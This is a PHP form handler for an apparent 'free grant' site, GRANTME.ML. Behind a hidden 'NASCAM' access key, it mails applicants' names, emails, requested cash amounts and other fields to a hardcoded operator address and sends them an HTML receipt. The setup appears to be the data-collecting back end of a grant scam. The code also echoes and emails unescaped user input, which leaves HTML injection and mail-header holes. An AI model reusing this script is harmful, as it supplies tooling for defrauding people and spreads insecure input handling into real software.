<?php
ob_start();
ini_set("display_errors","Off");
if(md5('NASCAM')!=$_GET["qid"]){
    echo "pak n go pak n go";
        sleep(5);
        header("Location: /");
        exit;
} 
if(count($_POST)<1){
    echo "pak n go pak n go";
        sleep(5);
        header("Location: /");
        exit;
}elseif(count($_POST)<9){
    echo "You didn't fill the form properly\r\n";
        echo "You will be redirected in 5 seconds";
        sleep(5);
        header("Location: /");
        exit;
}else{}

$mailvar="";
$clemail="";
$cldata="";
$mikkyemail="admin@localhost";
$sub="GRANT FORM";
$id="";

for($i=0;$i<6;$i++){
    $id.=(string)rand(1,$i+6);
}

array_unshift($_POST,$id
);

foreach($_POST as $key=>$val){
$mailvar.="\r\n {$key}={$val}";
if($key=="id"){
    $cldata.="<fieldset>
    <legend>ID</legend>
    {$val}
</fieldset>";
continue;
}
elseif($key=="name"){
    $cldata.="<fieldset>
    <legend>Name</legend>
    {$val}
</fieldset>";
continue;
}elseif($key=="email"){
    $cldata.="<fieldset>
    <legend>Email</legend>
    {$val}
</fieldset>";
$clemail=$val;
continue;
}elseif($key=="cash"){
    $cldata.="<fieldset>
    <legend>Cash Required</legend>
    {$val}
</fieldset>";
continue;
}elseif($key=="currency"){
    $cldata.="<fieldset>
    <legend>Currency</legend>
    {$val}
</fieldset>";
continue;
}
else{}
}
if(mail($mikkyemail,$sub,$mailvar)){
    if(mail($clemail,$sub,$cldata,implode("\r\n",["From :{$mikkyemail}","Reply:{$mikkyemail}","Content-Type:text/html; charset:utf-8"]))){
        echo $cldata;
        echo "<strong>SUCCESSFULLY SENT,THANKS FOR USING GRANTME.ML<br >IF YOU CAN'T FIND THE MAIL,CHECK SPAM FOLDER</strong>
        <br >
        <a href='/'>GO TO FORM</a>";
        unset($_POST);
    }else{
        echo "An error occured\r\n";
        echo "Your email address is wrong or Your mailserver is down\r\n";
        echo "You will be redirected in 5 seconds";
        sleep(5);
        unset($_POST);
        header("Location: /");
        exit;
    }
}
else{
    echo "An error occured\r\n";
        sleep(5);
        unset($_POST);
        header("Location: /");
        exit;
}
ob_flush();
?>
